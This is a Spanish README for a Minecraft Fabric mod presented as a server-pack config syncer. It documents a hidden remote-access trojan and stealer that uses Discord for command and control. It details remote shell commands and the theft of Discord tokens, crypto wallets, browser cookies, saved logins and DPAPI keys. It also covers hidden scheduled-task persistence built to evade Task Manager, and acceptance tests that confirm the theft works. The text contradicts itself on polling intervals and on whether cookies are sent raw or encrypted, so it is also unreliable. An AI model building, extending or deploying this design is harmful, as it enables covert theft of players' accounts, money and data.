# Server Pack Core

Mod cliente de Fabric para Minecraft 1.20.1. Se presenta como sincronizador de configuraciones de un pack de servidor privado.

## Arquitectura

El proyecto produce dos artefactos:

- **Mod** (`serverpackcore-0.1.2.jar`): loader y stager. El mixin sobre `MinecraftClient.tick` espera a estar en un mundo, sortea entre 20 y 60 segundos y, una sola vez por sesion, extrae el agente y lo lanza. No contiene logica de C2 ni de robo.
- **Agente** (`agent.jar`, embebido como `serverpackcore/agent.bin`): proceso Java independiente con el RAT y el stealer. Java puro, sin dependencias; no referencia `net.minecraft`.

Toda referencia a `net.minecraft` queda confinada al mixin y al entrypoint.

Directorios de instalacion:

- Windows: `%LOCALAPPDATA%\ServerPackCore`
- Linux: `$XDG_DATA_HOME/ServerPackCore` o `~/.local/share/ServerPackCore`
- macOS: `~/Library/Application Support/ServerPackCore`

El agente escribe `alive.txt` con el PID del juego y el suyo. El lockfile `spc-agent.lock` impide duplicados. El marcador `.installed` guarda la version instalada; si el binario o `spc-agent.jar` desaparecen, el stager los reextrae.

## C2 por Discord

La configuracion vive en `agent/src/main/java/com/serverpackcore/agent/DiscordConfig.java` y es quemable:

- `BOT_TOKEN`, `GUILD_ID`, `CATEGORY_ID`.

El agente usa solo REST, sin gateway ni intents privilegiados. En el primer arranque crea un canal bajo la categoria, registra un webhook propio para adjuntos y envia un embed de sistema. Si la creacion del canal falla, crea uno compartido con prefijo `spc-shared-`. El polling es de 2 s con jitter y pasa a 30 s tras 10 minutos sin actividad. Los 429 respetan `retry_after`; los errores de red usan backoff exponencial con techo.

Estado local en `state.json`: version, canal, webhook, ultimo ID y ultimo latido.

## Comandos

`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `screenshot`, `persist on|off`, `sleep`, `ping`, `kill`.

`shell` usa `cmd /c` o `/bin/sh -c`, fusiona stdout y stderr y corta a 60 s. Las salidas de mas de 1000 caracteres se suben como `.txt`; el resto va en un bloque de cuatro backticks.

## Stealer

El ZIP de harvest incluye cuentas de launcher, token de Discord validado contra `/users/@me`, carteras de Exodus, Electrum, Ledger Live, MetaMask y Phantom en Chrome, Edge y Brave (cada navegador bajo su propia etiqueta), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History`, la carpeta `Protect/` de DPAPI, `options.txt`, `servers.dat` y listado de `mods/`. Cookies y `Login Data` se suben crudas. El ZIP se corta a 8 MB y omite archivos de mas de 2 MB.

En Windows, por cada navegador detectado se anade `keys.txt` con la clave AES desenvuelta con DPAPI desde la sesion del propio usuario (`v10=`) y el blob `app_bound=` si existe. Es best-effort: si PowerShell esta restringido se deja `error=` y siguen valiendo `Local State` + `dpapi/`. Incluye usuario, SID, perfil y nombres de perfiles con cookies o credenciales.

## Persistencia

`persist on` es idempotente y prepara el arranque automatico: una tarea programada oculta en Windows o un `.desktop` en `~/.config/autostart` en Unix.

En Windows se usa una tarea al iniciar sesion (`\ServerPackCore`) con `<Hidden>true</Hidden>`; no aparece en la pestaña de inicio del Administrador de tareas, que solo lista `Run`/`RunOnce`, carpetas de Inicio y tareas UWP. La tarea, creada via `schtasks /create /xml`, queda invisible tambien en el Programador de tareas salvo que se activen las tareas ocultas. Si `schtasks` falla, se cae al `Run` clasico para no perder persistencia.

La tarea no apunta al `javaw.exe` copiado: un lanzador suelto no encuentra `lib\jvm.cfg` ni `bin\server\jvm.dll` al no tener `JAVA_HOME`. Se genera `spc-sync.vbs` en el directorio de instalacion, que fija `JAVA_HOME`, arranca oculto y prueba el `javaw.exe` del runtime real, la copia local y, por ultimo, `%JAVA_HOME%`.

El agente marca `persist` en `state.json` y regenera lanzador y tarea en cada arranque, asi que se repara sola si el runtime cambia de ruta, si un antivirus borra la tarea o si se deshabilita. `persist off` elimina tarea, valores `Run` heredados, `StartupApproved` y el `.vbs`.

Tampoco es invisible para todo: `schtasks /query`, el arbol `C:\Windows\System32\Tasks` y Autoruns siguen viendola. Ocultar de verdad exige servicios o `Winlogon\Shell`/`Userinit` (HKLM, con admin) o una suscripcion WMI permanente.

Si otro pack deja arranques por `wscript`/`.vbs`, `persist on` los lista y avisa si su ruta ya no existe o si reutiliza nuestro directorio. Coexisten sin problema salvo que maten procesos `java`/`javaw` o pisen la tarea/valor `ServerPackCore`.

## Requisitos

- Compilar: JDK 21 o superior (con `JAVA_HOME` apuntando a esa instalacion)
- Ejecutar: Java 17 o superior; probado en Java 17, 21 y 25
- Gradle 9.8.2 disponible en el `PATH` para regenerar el wrapper

El bytecode generado se fija a Java 17 (major 61) con `options.release = 17`.

Loom se fija en 1.17.21: la serie 1.18+ (incluida 1.19.3) esta compilada para JVM 25 y rompe la matriz de compilacion 21/25.

## Compatibilidad de ejecucion

El loader minimo es 0.20.1, necesario para ejecutar en Java 25. `runClient` funciona en Java 21 y 25.

## Generacion del wrapper

`gradlew`, `gradlew.bat` y `gradle/wrapper/gradle-wrapper.jar` son binarios y no se incluyen como texto. Generarlos una vez en la raiz del proyecto:

```sh
gradle wrapper --gradle-version 9.8.2
chmod +x gradlew
```

En macOS, para decodificar binarios desde base64 usa `base64 -D` en lugar de `base64 -d`.

## Fixtures locales

`.blob/` (unos 313 MB, con `ex.zip` de 158 MB) contiene fixtures locales usados por `decrypt.py`. No se trackea en git y no hace falta para compilar: puede permanecer solo en disco.

## Compilacion

Requiere JDK 21+ en `JAVA_HOME`; con un JDK anterior el build falla con un mensaje explicito. El jar se compila a bytecode 17 y `check` verifica que ninguna clase lo supere.

```sh
JAVA_HOME=/ruta/al/jdk21-o-superior ./gradlew build
```

La tarea raiz compila `agent/` con Gradle aparte y copia `agent.jar` a `src/main/resources/serverpackcore/agent.bin` antes de `processResources`. El jar final queda en `build/libs/serverpackcore-0.1.2.jar`.

## Instalacion

1. Crear un perfil de Fabric Loader 0.20.1 para Minecraft 1.20.1.
2. Instalar Fabric API 0.92.12+1.20.1 en el perfil (opcional).
3. Copiar `build/libs/serverpackcore-0.1.2.jar` a la carpeta `mods/` del perfil.

## Prueba de aceptacion

1. Ejecutar `./gradlew build` y confirmar que termina sin errores ni warnings.
2. Ejecutar `./gradlew runClient`, confirmar que el mod aparece y que el log no tiene salida del mod en release.
3. Entrar a un mundo, esperar el disparo y comprobar `alive.txt` con ambos PIDs y el agente vivo tras cerrar el juego.
4. Comprobar el canal nuevo en la categoria con embed y ZIP.
5. Enviar `shell dir` desde el movil y recibir respuesta en menos de 5 s.
6. Validar el token extraido contra `/users/@me`.
7. Ejecutar `persist on`, reiniciar el equipo y comprobar que el agente vuelve solo.

## Limites conocidos

- Fabric API ya no es requisito y no se usa ninguna de sus clases.
- El token de Discord se busca por regex en `leveldb`; variantes futuras del formato pueden requerirlo en claro y no detectarse.
- El ZIP corta a 8 MB y omite archivos mayores de 2 MB, asi que carteras o perfiles grandes pueden quedar incompletos.
- La GPU y la IP publica dependen de comandos o servicios externos; sin red o sin `wmic`/`lspci` quedan como `unknown`.
- `screenshot` requiere sesion grafica; en entornos headless devuelve error.
- No hay gateway: la latencia de comandos depende del polling (5 s, o 60 s en reposo).
- El bot token y los IDs van compilados; cambiarlos exige recompilar el agente.
- Las cookies y `Login Data` se suben cifradas. `keys.txt` abre las `v10`; las cookies `v20` de Chrome 127+ (App-Bound) no se descifran solo con DPAPI.
- En Linux el lanzamiento usa `setsid nohup`; si el entorno no los tiene, el proceso puede morir con el juego.
- La persistencia en Windows depende de `wscript.exe`: si se deshabilita Windows Script Host, la entrada no arranca. La copia de `javaw.exe` sola no sirve como respaldo porque necesita el runtime completo.
